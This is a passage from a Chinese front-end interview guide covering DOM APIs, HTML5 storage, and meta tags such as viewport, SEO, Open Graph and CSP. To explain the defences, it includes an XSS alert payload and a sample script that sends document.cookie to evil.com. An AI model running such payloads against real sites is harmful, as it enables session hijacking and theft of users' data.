<img src="product.jpg" alt="红色运动鞋，Nike 品牌，侧面视图">

<!-- 正确：装饰性图片使用空 alt -->
<img src="decorative-line.png" alt="">

<!-- 错误：省略 alt -->
<img src="important-image.jpg">  <!-- 不要这样做 -->

<!-- 正确：功能性图片 -->
<button>
    <img src="search-icon.png" alt="搜索">
</button>
```

**最佳实践：**
- 内容图片：提供描述性 alt 文本
- 装饰性图片：使用 `alt=""` 表示无语义，或使用 CSS 背景图
- 功能性图片：alt 描述功能（如"搜索"、"关闭"）
- 不要用 alt 做关键词堆砌

---

**题目2：如何实现视频自动播放？有哪些限制？**

**满分答案：**

**基本实现：**

```html
<video src="video.mp4" autoplay muted loop playsinline></video>
```

**浏览器限制（ autoplay policy）：**

1. **必须有 `muted` 属性**
   - Chrome、Safari、Firefox 等主流浏览器禁止带声音自动播放
   - 必须设置 `muted` 才能自动播放

2. **用户交互后才能播放声音**
   ```javascript
   // 用户点击后取消静音
   document.getElementById('btn').addEventListener('click', () => {
       video.muted = false;
   });
   ```

3. **移动端额外限制**
   - iOS Safari 需要 `playsinline` 属性才能内联播放
   - 低电量模式可能禁止自动播放

4. **MEI（Media Engagement Index）**
   - Chrome 会记录用户与媒体的交互频率
   - 高 MEI 站点可能获得自动播放权限

**检测是否能自动播放：**

```javascript
const video = document.querySelector('video');

video.play().then(() => {
    console.log('自动播放成功');
}).catch(error => {
    console.log('自动播放失败', error);
    // 显示播放按钮让用户手动播放
});
```

**最佳实践：**

```html
<video 
    id="bgVideo"
    autoplay 
    muted 
    loop 
    playsinline
    poster="fallback.jpg"
>
    <source src="video.webm" type="video/webm">
    <source src="video.mp4" type="video/mp4">
</video>

<!-- 始终提供播放按钮作为后备 -->
<button id="playBtn" style="display:none">播放</button>

<script>
const video = document.getElementById('bgVideo');
const playBtn = document.getElementById('playBtn');

video.play().catch(() => {
    playBtn.style.display = 'block';
});

playBtn.addEventListener('click', () => {
    video.play();
});
</script>
```

---

### 1.1.8 DOM 结构与节点操作

#### 知识点详解

**DOM 节点类型：**

| 节点类型 | nodeType | 说明 |
|----------|----------|------|
| Element | 1 | 元素节点 |
| Text | 3 | 文本节点 |
| Comment | 8 | 注释节点 |
| Document | 9 | document 节点 |
| DocumentType | 10 | `<!DOCTYPE>` |
| DocumentFragment | 11 | 文档片段 |

**选择元素：**

```javascript
// 通过 ID 选择
const el = document.getElementById('myId');

// 通过类名选择（返回 HTMLCollection）
const els = document.getElementsByClassName('myClass');

// 通过标签名选择（返回 HTMLCollection）
const divs = document.getElementsByTagName('div');

// CSS 选择器（返回第一个匹配）
const el = document.querySelector('.myClass');
const el = document.querySelector('#myId');
const el = document.querySelector('div.container > p:first-child');

// CSS 选择器（返回所有匹配，NodeList）
const els = document.querySelectorAll('.myClass');

// 特殊元素
const html = document.documentElement;
const head = document.head;
const body = document.body;
const title = document.title;
```

**节点关系：**

```javascript
const el = document.getElementById('myId');

// 父节点
el.parentNode;
el.parentElement;

// 子节点（包含文本、注释等所有节点）
el.childNodes;  // NodeList
el.firstChild;
el.lastChild;

// 子元素（仅元素节点）
el.children;    // HTMLCollection
el.firstElementChild;
el.lastElementChild;

// 兄弟节点
el.previousSibling;      // 前一个节点（可能是文本节点）
el.nextSibling;          // 后一个节点
el.previousElementSibling;  // 前一个元素
el.nextElementSibling;      // 后一个元素
```

**创建和插入节点：**

```javascript
// 创建元素
const div = document.createElement('div');
div.id = 'newDiv';
div.className = 'container';
div.textContent = 'Hello';

// 创建文本节点
const text = document.createTextNode('Hello');

// 创建文档片段（批量插入时提高性能）
const fragment = document.createDocumentFragment();

// 插入节点
parent.appendChild(child);           // 添加到最后
parent.insertBefore(newNode, refNode);  // 插入到参考节点前

// 新增 API
parent.append(child1, child2, 'text');  // 添加到末尾，支持多个参数和字符串
parent.prepend(child);                   // 添加到开头
el.before(newNode);                      // 插入到元素前
el.after(newNode);                       // 插入到元素后

// 替换节点
parent.replaceChild(newChild, oldChild);
el.replaceWith(newNode);  // 新 API

// 克隆节点
const clone = el.cloneNode();       // 浅克隆，不包含子节点
const clone = el.cloneNode(true);   // 深克隆，包含子节点
```

**删除节点：**

```javascript
// 传统方法
parent.removeChild(child);

// 新 API
el.remove();
```

**修改内容和属性：**

```javascript
// 内容
el.textContent = '纯文本';        // 设置文本，安全（不解析 HTML）
el.innerHTML = '<b>HTML</b>';     // 设置 HTML，注意 XSS 风险
el.outerHTML = '<div>替换整个元素</div>';

// 属性
el.getAttribute('class');
el.setAttribute('class', 'newClass');
el.removeAttribute('class');
el.hasAttribute('class');

// data-* 属性
el.dataset.userId = '123';        // data-user-id="123"
console.log(el.dataset.userId);   // "123"

// 类名
el.className = 'class1 class2';
el.classList.add('class3');
el.classList.remove('class1');
el.classList.toggle('active');
el.classList.contains('active');  // boolean
el.classList.replace('old', 'new');

// 样式
el.style.color = 'red';
el.style.fontSize = '16px';
el.style.cssText = 'color: red; font-size: 16px;';

// 获取计算样式
const computed = getComputedStyle(el);
console.log(computed.color);
```

#### 真实面试题

**题目1：`innerHTML`、`textContent`、`outerHTML` 有什么区别？**

**满分答案：**

| 属性 | 作用 | 安全性 | 性能 |
|------|------|--------|------|
| `textContent` | 获取/设置纯文本内容 | 安全（HTML 会被转义） | 最快 |
| `innerHTML` | 获取/设置 HTML 内容 | 不安全（XSS 风险） | 较快 |
| `outerHTML` | 获取/设置元素本身+内容 | 不安全（XSS 风险） | 较快 |

**示例对比：**

```javascript
const el = document.getElementById('test');

// 假设 HTML 为：<div id="test"><b>Hello</b></div>

el.textContent;// → "Hello"（纯文本，标签被去除）

el.innerHTML;
// → "<b>Hello</b>"（包含 HTML 标签）

el.outerHTML;
// → '<div id="test"><b>Hello</b></div>'（包含元素本身）
```

**设置内容对比：**

```javascript
// textContent：安全，HTML 标签会被转义为文本
el.textContent = '<b>Hello</b>';
// 页面显示：<b>Hello</b>（原样显示，不解析）

// innerHTML：解析 HTML，存在 XSS 风险
el.innerHTML = '<b>Hello</b>';
// 页面显示：**Hello**（加粗显示）

// 危险示例
el.innerHTML = '<img src=x onerror="alert(1)">';  // XSS 攻击！

// 安全替代方案
el.textContent = userInput;  // 永远安全
// 或使用 DOMPurify 库净化 HTML
el.innerHTML = DOMPurify.sanitize(userInput);
```

**outerHTML 的特殊用法：**

```javascript
// 替换整个元素
el.outerHTML = '<span>替换了整个 div</span>';
// 注意：替换后 el 变量仍指向旧元素，需要重新获取
```

**选择建议：**
- 显示用户输入内容 → 用 `textContent`（安全）
- 插入可信 HTML 片段 → 用 `innerHTML`
- 替换整个元素 → 用 `outerHTML`

---

**题目2：如何高效地批量插入 DOM 节点？**

**满分答案：**

**问题：** 频繁操作 DOM 会触发多次重排（reflow）和重绘（repaint），性能差。

**方案一：DocumentFragment（推荐）**

```javascript
// 创建文档片段（不在 DOM 树中，操作不触发重排）
const fragment = document.createDocumentFragment();

for (let i = 0; i < 1000; i++) {
    const li = document.createElement('li');
    li.textContent = `Item ${i}`;
    fragment.appendChild(li);  // 操作 fragment，不触发重排
}

// 一次性插入，只触发一次重排
document.getElementById('list').appendChild(fragment);
```

**方案二：innerHTML 字符串拼接**

```javascript
const items = Array.from({ length: 1000 }, (_, i) => `<li>Item ${i}</li>`);
document.getElementById('list').innerHTML = items.join('');
// 注意：会清空原有内容，且有 XSS 风险
```

**方案三：insertAdjacentHTML**

```javascript
const list = document.getElementById('list');
const html = Array.from({ length: 1000 }, (_, i) => `<li>Item ${i}</li>`).join('');
list.insertAdjacentHTML('beforeend', html);
// 不清空原有内容，性能较好
```

**性能对比：**

| 方案 | 重排次数 | 安全性 | 推荐度 |
|------|----------|--------|--------|
| 逐个 appendChild | N 次 | 安全 | ❌ |
| DocumentFragment | 1 次 | 安全 | ✅ |
| innerHTML 拼接 | 1 次 | 有风险 | ⚠️ |
| insertAdjacentHTML | 1 次 | 有风险 | ⚠️ |

**最佳实践：** 使用 `DocumentFragment` 或先将元素从 DOM 中移除，操作完再插入。

---

### 1.1.9 HTML5 新特性

#### 知识点详解

**本地存储：**

```javascript
// localStorage：持久化存储，关闭浏览器不丢失
localStorage.setItem('key', 'value');
localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear();

// 存储对象
localStorage.setItem('user', JSON.stringify({ name: '张三', age: 25 }));
const user = JSON.parse(localStorage.getItem('user'));

// sessionStorage：会话存储，关闭标签页即清除
sessionStorage.setItem('token', 'abc123');
sessionStorage.getItem('token');
```

**Web Worker：**

```javascript
// main.js
const worker = new Worker('worker.js');

worker.postMessage({ data: [1, 2, 3, 4, 5] });

worker.onmessage = function(e) {
    console.log('Worker 返回：', e.data);
};

// worker.js（独立线程，无法访问 DOM）
self.onmessage = function(e) {
    const result = e.data.data.reduce((a, b) => a + b, 0);
    self.postMessage(result);
};
```

**WebSocket：**

```javascript
const ws = new WebSocket('wss://example.com/socket');

ws.onopen = () => {
    console.log('连接已建立');
    ws.send(JSON.stringify({ type: 'hello' }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    console.log('收到消息：', data);
};

ws.onclose = () => console.log('连接已关闭');
ws.onerror = (err) => console.error('连接错误', err);
```

**Geolocation：**

```javascript
navigator.geolocation.getCurrentPosition(
    (position) => {
        const { latitude, longitude } = position.coords;
        console.log(`纬度：${latitude}，经度：${longitude}`);
    },
    (error) => {
        console.error('获取位置失败：', error.message);
    },
    { enableHighAccuracy: true, timeout: 5000 }
);
```

#### 真实面试题

**题目：localStorage、sessionStorage、Cookie 有什么区别？**

**满分答案：**

| 特性 | localStorage | sessionStorage | Cookie |
|------|-------------|----------------|--------|
| 存储大小 | 约 5MB | 约 5MB | 约 4KB |
| 生命周期 | 永久（手动清除） | 标签页关闭即清除 | 可设置过期时间 |
| 作用域 | 同源所有标签页共享 | 仅当前标签页 | 同源（可设置域和路径） |
| 随请求发送 | 否 | 否 | 是（自动携带） |
| 服务端访问 | 否 | 否 | 是 |
| API 易用性 | 简单 | 简单 | 复杂 |
| 安全性 | 易受 XSS | 易受 XSS | 可设置 HttpOnly 防 XSS |

**使用场景：**

```javascript
// localStorage：用户偏好、主题设置、长期缓存
localStorage.setItem('theme', 'dark');

// sessionStorage：临时表单数据、单次会话状态
sessionStorage.setItem('formStep', '2');

// Cookie：身份认证 token（配合 HttpOnly + Secure）
// 通常由服务端 Set-Cookie 设置
document.cookie = 'name=value; path=/; max-age=3600; Secure; SameSite=Strict';
```

**安全建议：**
- 敏感信息（token）优先用 `HttpOnly Cookie`，防止 JS 读取
- 不要在 localStorage 中存储密码或敏感数据
- 使用 `SameSite=Strict` 防止 CSRF 攻击

---


---

## 1.2 Meta 标签详解

> meta 标签是前端面试高频考点，涵盖 SEO、移动端适配、社交分享、安全策略等多个方向。

---

### 1.2.1 meta 标签基础

#### 知识点详解

**meta 标签的作用：**

`<meta>` 标签位于 `<head>` 中，用于描述 HTML 文档的元数据（metadata）。元数据不会直接显示在页面上，但会被浏览器、搜索引擎、社交平台等读取和使用。

**meta 标签的两种主要形式：**

```html
<!-- 形式一：name + content（描述页面信息） -->
<meta name="description" content="页面描述">

<!-- 形式二：http-equiv + content（模拟 HTTP 响应头） -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
```

**必须掌握的 meta 标签清单：**

```html
<head>
    <!-- 1. 字符编码（必须放在最前面） -->
    <meta charset="UTF-8">

    <!-- 2. 移动端视口（响应式必备） -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- 3. SEO 三件套 -->
    <meta name="description" content="页面描述，建议 120-160 字符">
    <meta name="keywords" content="关键词1, 关键词2, 关键词3">
    <meta name="author" content="作者名称">

    <!-- 4. 兼容性 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <!-- 5. 刷新/跳转 -->
    <meta http-equiv="refresh" content="5;url=https://example.com">

    <!-- 6. 禁止缓存 -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">

    <!-- 7. 主题色（移动端浏览器工具栏颜色） -->
    <meta name="theme-color" content="#4285f4">

    <!-- 8. 禁止搜索引擎索引 -->
    <meta name="robots" content="noindex, nofollow">
</head>
```

#### 真实面试题

**题目：meta 标签有哪些常见用途？请列举并说明。**

**满分答案：**

meta 标签主要有以下几类用途：

**1. 字符编码**
```html
<meta charset="UTF-8">
```
- 声明文档字符编码，必须放在 `<head>` 最前面
- UTF-8 支持全球所有语言字符，是标准选择
- 如果不声明，浏览器会猜测编码，可能导致乱码

**2. 移动端适配**
```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```
- 控制页面在移动端的显示方式
- 不加此标签，移动端会以 980px 宽度渲染，内容缩小

**3. SEO 优化**
```html
<meta name="description" content="页面描述">
<meta name="keywords" content="关键词">
<meta name="robots" content="index, follow">
```
- description 会显示在搜索结果摘要中
- keywords 现代搜索引擎已基本忽略，但仍可写
- robots 控制爬虫行为

**4. 兼容性控制**
```html
<meta http-equiv="X-UA-Compatible" content="IE=edge">
```
- 告诉 IE 使用最新渲染引擎
- 避免 IE 进入兼容模式

**5. 安全策略**
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```
- 限制页面可加载的资源来源
- 防止 XSS 攻击

**延伸问题：**
- meta description 对 SEO 有直接影响吗？（答：不直接影响排名，但影响点击率）
- viewport 的 user-scalable=no 有什么问题？（答：影响无障碍访问，不推荐使用）

---

### 1.2.2 viewport 视口详解

#### 知识点详解

**viewport 是什么：**

viewport（视口）是浏览器中用于显示网页的区域。移动端有三种视口概念：

| 视口类型 | 说明 | 大小 |
|----------|------|------|
| 布局视口（layout viewport） | 页面实际渲染宽度 | 默认 980px（移动端） |
| 视觉视口（visual viewport） | 用户当前看到的区域 | 设备屏幕宽度 |
| 理想视口（ideal viewport） | 最适合该设备的视口 | 设备逻辑像素宽度 |

**viewport meta 标签完整参数：**

```html
<meta name="viewport" content="
    width=device-width,      /* 布局视口宽度 = 设备逻辑像素宽度 */
    initial-scale=1.0,       /* 初始缩放比例 */
    minimum-scale=1.0,       /* 最小缩放比例 */
    maximum-scale=1.0,       /* 最大缩放比例 */
    user-scalable=no,        /* 禁止用户缩放（不推荐） */
    viewport-fit=cover       /* 适配刘海屏 */
">
```

**各参数详解：**

```html
<!-- 标准响应式写法 -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- 禁止缩放（不推荐，影响无障碍） -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">

<!-- 适配 iPhone 刘海屏 -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
```

**viewport-fit 与安全区域：**

```css
/* 配合 viewport-fit=cover 使用 */
.header {
    /* 顶部安全区域（状态栏高度） */
    padding-top: env(safe-area-inset-top);
}

.footer {
    /* 底部安全区域（Home 指示条） */
    padding-bottom: env(safe-area-inset-bottom);
}

.sidebar {
    /* 左右安全区域（横屏刘海） */
    padding-left: env(safe-area-inset-left);
    padding-right: env(safe-area-inset-right);
}
```

**不设置 viewport 的后果：**

```
移动端默认布局视口 = 980px
→ 页面按 980px 渲染
→ 在 375px 屏幕上显示，整体缩小约 2.6 倍
→ 文字极小，用户需要手动放大
→ 响应式布局完全失效
```

#### 真实面试题

**题目1：移动端为什么要设置 `width=device-width`？不设置会怎样？**

**满分答案：**

**原因：**

移动端浏览器默认的布局视口宽度是 980px（为了兼容早期 PC 网站），而手机屏幕逻辑像素通常只有 375px-414px。

**不设置的后果：**

```
iPhone 14（逻辑像素 390px）
→ 布局视口默认 980px
→ 页面按 980px 宽度渲染
→ 缩放比例 = 390 / 980 ≈ 0.4
→ 所有内容缩小为原来的 40%
→ 媒体查询 @media (max-width: 768px) 不会触发
→ 响应式布局完全失效
```

**设置后的效果：**

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

```
iPhone 14（逻辑像素 390px）
→ 布局视口 = 390px
→ 页面按 390px 宽度渲染
→ 缩放比例 = 1.0
→ 媒体查询正常触发
→ 响应式布局正常工作
```

**验证方式：**

```javascript
// 获取布局视口宽度
console.log(document.documentElement.clientWidth);

// 获取视觉视口宽度
console.log(window.innerWidth);

// 获取设备像素比
console.log(window.devicePixelRatio);  // iPhone 通常为 2 或 3
```

---

**题目2：`initial-scale=1.0` 和 `width=device-width` 有什么关系？只写一个行不行？**

**满分答案：**

**两者的关系：**

- `width=device-width`：设置布局视口宽度等于设备逻辑像素宽度
- `initial-scale=1.0`：设置初始缩放比例为 1（不缩放）

**只写一个的问题：**

```html
<!-- 只写 width=device-width -->
<meta name="viewport" content="width=device-width">
<!-- 问题：iOS Safari 横屏时不会自动调整，可能出现缩放问题 -->

<!-- 只写 initial-scale=1.0 -->
<meta name="viewport" content="initial-scale=1.0">
<!-- 问题：IE 10 Mobile 等旧浏览器可能不识别，布局视口不正确 -->
```

**最佳实践：两者同时写**

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

两者同时写可以互相补充，覆盖更多浏览器兼容场景，是业界标准写法。

---

### 1.2.3 SEO 相关 meta 标签

#### 知识点详解

**核心 SEO meta 标签：**

```html
<!-- 页面描述：显示在搜索结果摘要，建议 120-160 字符 -->
<meta name="description" content="这是一个前端开发学习平台，提供 HTML、CSS、JavaScript 等技术教程和面试题库。">

<!-- 关键词：现代搜索引擎基本忽略，但仍可写 -->
<meta name="keywords" content="前端开发, HTML, CSS, JavaScript, Vue, React">

<!-- 作者 -->
<meta name="author" content="张三">

<!-- 爬虫控制 -->
<meta name="robots" content="index, follow">
<!--
    index/noindex：是否收录此页面
    follow/nofollow：是否跟踪页面上的链接
    noarchive：不缓存页面快照
    nosnippet：不显示摘要
-->

<!-- 针对特定搜索引擎 -->
<meta name="googlebot" content="index, follow">
<meta name="baiduspider" content="index, follow">
```

**Open Graph 协议（社交分享）：**

```html
<!-- 微信、微博、Facebook 等分享时显示的信息 -->
<meta property="og:title" content="页面标题">
<meta property="og:description" content="页面描述">
<meta property="og:image" content="https://example.com/share-image.jpg">
<meta property="og:url" content="https://example.com/page">
<meta property="og:type" content="website">
<meta property="og:site_name" content="网站名称">

<!-- 文章类型 -->
<meta property="og:type" content="article">
<meta property="article:published_time" content="2025-03-18T08:00:00+08:00">
<meta property="article:author" content="张三">
```

**Twitter Card：**

```html
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="页面标题">
<meta name="twitter:description" content="页面描述">
<meta name="twitter:image" content="https://example.com/image.jpg">
<meta name="twitter:site" content="@username">
```

**规范链接（避免重复内容）：**

```html
<!-- 告诉搜索引擎此页面的权威 URL -->
<link rel="canonical" href="https://example.com/page">
```

#### 真实面试题

**题目1：meta description 对 SEO 排名有直接影响吗？如何写好 description？**

**满分答案：**

**对排名的影响：**

meta description **不直接影响搜索排名**，Google 官方已明确表示不将其作为排名因素。但它**间接影响 SEO**：

- 显示在搜索结果摘要中，影响用户点击率（CTR）
- 高点击率会向搜索引擎传递正向信号，间接提升排名
- 如果不写，搜索引擎会自动截取页面内容，效果通常更差

**如何写好 description：**

```html
<!-- ❌ 不好的写法 -->
<meta name="description" content="首页">
<meta name="description" content="欢迎来到我们的网站，我们提供各种服务。">

<!-- ✅ 好的写法 -->
<meta name="description" content="前端面试题库 | 收录 500+ 真实面试题，涵盖 HTML、CSS、JavaScript、Vue、React，附满分答案，助你轻松通过大厂面试。">
```

**写好 description 的要点：**

1. **长度控制**：120-160 字符（中文约 60-80 字）
2. **包含核心关键词**：自然融入，不堆砌
3. **突出价值**：告诉用户点进来能得到什么
4. **有行动号召**：如"立即查看"、"免费下载"
5. **每页唯一**：不同页面写不同的 description
6. **真实准确**：与页面内容一致，避免跳出率高

---

**题目2：什么是 Open Graph 协议？为什么前端开发需要了解它？**

**满分答案：**

**Open Graph 协议：**

Open Graph（OG）是 Facebook 于 2010 年提出的一套元数据协议，通过在 HTML `<head>` 中添加 `og:` 前缀的 meta 标签，让网页内容在社交平台分享时能展示丰富的预览信息（标题、描述、图片等）。

**为什么前端需要了解：**

```html
<!-- 没有 OG 标签时分享效果 -->
<!-- 微信/微博只显示 URL，无图片无描述，点击率极低 -->

<!-- 有 OG 标签时分享效果 -->
<meta property="og:title" content="2025 前端面试必考题 100 道">
<meta property="og:description" content="涵盖 Vue3、React Hooks、TypeScript 等热门考点，附详细解析">
<meta property="og:image" content="https://example.com/cover.jpg">
<meta property="og:url" content="https://example.com/interview">
<!-- 分享后显示：大图 + 标题 + 描述，点击率提升 3-5 倍 -->
```

**各平台支持情况：**

| 平台 | 协议 | 图片尺寸建议 |
|------|------|-------------|
| 微信 | Open Graph | 300×300 以上，正方形 |
| 微博 | Open Graph | 600×314 |
| Facebook | Open Graph | 1200×630 |
| Twitter | Twitter Card | 1200×628 |
| LinkedIn | Open Graph | 1200×627 |

**最佳实践：**

```html
<head>
    <!-- 基础 SEO -->
    <title>2025 前端面试必考题 100 道</title>
    <meta name="description" content="涵盖 Vue3、React Hooks、TypeScript 等热门考点">

    <!-- Open Graph（微信、微博、Facebook） -->
    <meta property="og:title" content="2025 前端面试必考题 100 道">
    <meta property="og:description" content="涵盖 Vue3、React Hooks、TypeScript 等热门考点，附详细解析">
    <meta property="og:image" content="https://example.com/cover.jpg">
    <meta property="og:url" content="https://example.com/interview">
    <meta property="og:type" content="article">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="2025 前端面试必考题 100 道">
    <meta name="twitter:image" content="https://example.com/cover.jpg">
</head>
```

---

### 1.2.4 安全相关 meta 标签

#### 知识点详解

**Content Security Policy（CSP）：**

```html
<!-- 通过 meta 设置 CSP（推荐通过 HTTP 响应头设置，效果更好） -->
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' https://cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.googleapis.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none'
">
```

**CSP 指令说明：**

| 指令 | 作用 |
|------|------|
| `default-src` | 默认资源来源（其他指令的后备） |
| `script-src` | JavaScript 来源 |
| `style-src` | CSS 来源 |
| `img-src` | 图片来源 |
| `font-src` | 字体来源 |
| `connect-src` | Ajax/WebSocket 连接来源 |
| `frame-src` | iframe 来源 |
| `frame-ancestors` | 谁可以嵌入此页面（防点击劫持） |

**常用值：**

```
'self'          → 仅允许同源
'none'          → 禁止所有
'unsafe-inline' → 允许内联脚本/样式（不推荐）
'unsafe-eval'   → 允许 eval()（不推荐）
https:          → 允许所有 HTTPS 来源
data:           → 允许 data: URI
```

**其他安全相关 meta：**

```html
<!-- 禁止 IE 嗅探 MIME 类型（防止 MIME 混淆攻击） -->
<meta http-equiv="X-Content-Type-Options" content="nosniff">

<!-- 防止点击劫持（推荐用 HTTP 头，meta 不支持此功能） -->
<!-- 正确做法：在服务端设置 X-Frame-Options: DENY -->

<!-- 强制 HTTPS（仅 HTTP 头有效，meta 无效） -->
<!-- 正确做法：在服务端设置 Strict-Transport-Security -->

<!-- 禁用 DNS 预取（隐私保护） -->
<meta http-equiv="x-dns-prefetch-control" content="off">
```

#### 真实面试题

**题目：什么是 CSP？它能防御哪些攻击？如何配置？**

**满分答案：**

**CSP 是什么：**

Content Security Policy（内容安全策略）是一种浏览器安全机制，通过白名单方式声明页面可以加载哪些来源的资源，从而防止恶意内容注入。

**能防御的攻击：**

1. **XSS（跨站脚本攻击）**
```html
<!-- 攻击者注入了以下脚本 -->
<script>document.location='https://evil.com?cookie='+document.cookie</script>

<!-- 有 CSP 时：script-src 'self' 只允许同源脚本 -->
<!-- 浏览器拒绝执行外部脚本，XSS 失效 -->
```

2. **数据注入攻击**：限制 connect-src，防止数据被发送到恶意服务器

3. **点击劫持**：通过 `frame-ancestors 'none'` 禁止页面被嵌入 iframe

4. **混合内容攻击**：强制 HTTPS 资源加载

**配置示例（从严到宽）：**

```html
<!-- 最严格：只允许同源资源 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">

<!-- 实际项目常用配置 -->
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' https://cdn.bootcdn.net;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.mysite.com;
    frame-ancestors 'none'
">
```

**推荐做法：**

```
优先通过 HTTP 响应头设置 CSP（比 meta 更安全，meta 可被 XSS 修改）
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**延伸问题：**
- `'unsafe-inline'` 为什么不安全？（答：允许内联脚本，XSS 注入的脚本也会被执行）
- 如何在不破坏功能的前提下逐步启用 CSP？（答：先用 `Content-Security-Policy-Report-Only` 模式收集违规报告，再逐步收紧）

---

### 1.2.5 移动端专用 meta 标签

#### 知识点详解

**iOS Safari 专用：**

```html
<!-- 添加到主屏幕时的应用名称 -->
<meta name="apple-mobile-web-app-title" content="我的应用">

<!-- 全屏模式（添加到主屏幕后隐藏浏览器 UI） -->
<meta name="apple-mobile-web-app-capable" content="yes">

<!-- 状态栏样式（需配合 apple-mobile-web-app-capable） -->
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!--
    default：白色状态栏
    black：黑色状态栏
    black-translucent：透明状态栏（页面延伸到状态栏下方）
-->

<!-- 禁止自动识别电话号码 -->
<meta name="format-detection" content="telephone=no">

<!-- 禁止自动识别邮箱和地址 -->
<meta name="format-detection" content="telephone=no, email=no, address=no">

<!-- 主屏幕图标 -->
<link rel="apple-touch-icon" href="icon-180x180.png">
<link rel="apple-touch-icon" sizes="152x152" href="icon-152x152.png">
<link rel="apple-touch-icon" sizes="167x167" href="icon-167x167.png">
<link rel="apple-touch-icon" sizes="180x180" href="icon-180x180.png">

<!-- 启动画面 -->
<link rel="apple-touch-startup-image" href="launch.png">
```

**Android / PWA 专用：**

```html
<!-- 主题色（Chrome 地址栏颜色） -->
<meta name="theme-color" content="#4285f4">

<!-- 深色模式下的主题色 -->
<meta name="theme-color" content="#1a1a1a" media="(prefers-color-scheme: dark)">

<!-- PWA manifest -->
<link rel="manifest" href="/manifest.json">
```

**通用移动端优化：**

```html
<!-- 禁止自动识别电话号码（iOS + Android） -->
<meta name="format-detection" content="telephone=no">

<!-- 360 浏览器使用 Webkit 内核 -->
<meta name="renderer" content="webkit">

<!-- QQ 浏览器强制竖屏 -->
<meta name="x5-orientation" content="portrait">

<!-- QQ 浏览器全屏 -->
<meta name="x5-fullscreen" content="true">

<!-- UC 浏览器强制竖屏 -->
<meta name="screen-orientation" content="portrait">
```

**完整的移动端 head 模板：**

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">

    <title>页面标题</title>
    <meta name="description" content="页面描述">

    <!-- 移动端优化 -->
    <meta name="format-detection" content="telephone=no, email=no, address=no">
    <meta name="theme-color" content="#ffffff">

    <!-- iOS PWA -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="应用名称">
    <link rel="apple-touch-icon" href="/icons/icon-180x180.png">

    <!-- PWA -->
    <link rel="manifest" href="/manifest.json">

    <!-- Open Graph -->
    <meta property="og:title" content="页面标题">
    <meta property="og:description" content="页面描述">
    <meta property="og:image" content="https://example.com/og-image.jpg">
    <meta property="og:url" content="https://example.com">
</head>
```

#### 真实面试题

**题目1：`format-detection` 有什么作用？什么场景下需要禁用？**

**满分答案：**

**`format-detection` 的作用：**

控制浏览器是否自动识别页面中的特定格式内容并转换为可点击链接。

```html
<!-- 默认行为：浏览器自动识别 -->
<!-- 页面中的 "13800138000" 会被自动转为 <a href="tel:13800138000"> -->
<!-- 页面中的 "test@example.com" 会被自动转为 <a href="mailto:..."> -->

<!-- 禁用自动识别 -->
<meta name="format-detection" content="telephone=no, email=no, address=no">
```

**需要禁用的场景：**

1. **数字内容被误识别**
```html
<!-- 订单号、身份证号、银行卡号等被识别为电话号码 -->
<p>订单号：13800138000</p>
<!-- 禁用后不会变成可点击的电话链接 -->
```

2. **样式被破坏**
   - 自动识别的链接会有默认样式（蓝色下划线），破坏设计

3. **需要自定义点击行为**
   - 禁用自动识别后，手动添加带有自定义样式和行为的链接

**最佳实践：**

```html
<!-- 全局禁用自动识别 -->
<meta name="format-detection" content="telephone=no, email=no, address=no">

<!-- 需要电话链接时手动添加 -->
<a href="tel:13800138000" class="phone-link">13800138000</a>
```

---

**题目2：如何让网页在 iOS 添加到主屏幕后像原生 App 一样全屏运行？**

**满分答案：**

**实现步骤：**

```html
<head>
    <!-- 第一步：声明支持全屏模式 -->
    <meta name="apple-mobile-web-app-capable" content="yes">

    <!-- 第二步：设置状态栏样式 -->
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

    <!-- 第三步：设置应用名称（主屏幕图标下方显示） -->
    <meta name="apple-mobile-web-app-title" content="我的应用">

    <!-- 第四步：设置主屏幕图标 -->
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/icon-180x180.png">

    <!-- 第五步：适配刘海屏 -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
</head>
```

**配合 CSS 处理安全区域：**

```css
/* 避免内容被刘海/Home 条遮挡 */
body {
    padding-top: env(safe-area-inset-top);
    padding-bottom: env(safe-area-inset-bottom);
    padding-left: env(safe-area-inset-left);
    padding-right: env(safe-area-inset-right);
}

/* 或者使用 constant()（兼容旧版 iOS） */
body {
    padding-top: constant(safe-area-inset-top);
    padding-top: env(safe-area-inset-top);
}
```

**检测是否在全屏模式下运行：**

```javascript
// 检测是否以 PWA 模式运行
const isStandalone = window.navigator.standalone === true
    || window.matchMedia('(display-mode: standalone)').matches;

if (isStandalone) {
    console.log('正在以全屏 App 模式运行');
}
```

**注意事项：**
